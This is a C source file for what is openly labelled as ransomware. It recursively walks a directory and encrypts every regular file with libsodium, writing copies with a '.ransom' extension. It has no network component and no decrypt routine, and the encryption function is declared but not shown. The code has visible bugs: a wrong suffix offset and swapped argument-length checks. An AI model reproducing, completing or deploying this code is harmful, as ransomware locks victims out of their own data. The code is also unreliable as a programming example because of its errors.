#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <sodium.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <pwd.h>
#include <stdbool.h>


#define _GNU_SOURCE
#define MAX_FILEPATH 256
#define MAX_KEY_LEN crypto_secretstream_xchacha20poly1305_KEYBYTES

// encrypt.c
int encrypt_file(const char filepath[MAX_FILEPATH],
        const char optfilepath[MAX_FILEPATH], const char password[MAX_KEY_LEN]);

// decrypt.c


void get_new_path_name(char *parentPath, char *finalPath, char *currentPath)
{
    strcpy(finalPath, parentPath);
    strcat(finalPath, "/");
    strcat(finalPath, currentPath);
}

void add_file_extension(char *fileName, char *optFileName)
{
    strcpy(optFileName, fileName);
    strcat(optFileName, ".ransom");
}

int encrypt_recursively_files(char *path, char *password)
{
    DIR *curDir = opendir(path);
    char newPath[MAX_FILEPATH];
    char optFileName[MAX_FILEPATH];
    struct dirent *dirEntry = NULL;
    int len = 0;
    const char *suff = NULL;

    while((dirEntry = readdir(curDir)) != NULL) {
        len = strlen(dirEntry->d_name);
        suff = &dirEntry->d_name[len - 9];
        if (strcmp(suff,".ransom")) {
            if (strcmp(dirEntry->d_name, ".") && strcmp(dirEntry->d_name,"..")) {
                switch (dirEntry->d_type) {
                    case 4:
                        get_new_path_name(path, newPath, dirEntry->d_name);
                        encrypt_recursively_files(newPath, password); break;
                    case 8:
                        get_new_path_name(path, newPath, dirEntry->d_name);
                        add_file_extension(newPath, optFileName);
                        encrypt_file(newPath, optFileName, password);
                        break;
#ifdef _DIRENT_HAVE_D_TYPE
                    case DT_UNKNOWN:
                        printf("Data Type Unknown\n\n\n"); break;
#endif
                }
            }
        }
    }
    closedir(curDir);
    return 0;
}

int main(int ac, char **av)
{
    // TODO : optarg for decrypt and encrypt
    if (ac != 3) {
        dprintf(STDERR_FILENO, "Need two arguments:\n"
                "[Directory path to encrypt] [password]");
        return 1;
    }
    if (strlen(av[1]) > MAX_KEY_LEN) {
        printf("Error: password must be %d characters long.", MAX_KEY_LEN);
        return 1;
    } else if (strlen(av[2]) > MAX_FILEPATH) {
        printf("Error: path must be %d characters long.", MAX_FILEPATH);
        return 1;
    }

    return encrypt_recursively_files(av[1], av[2]);
}
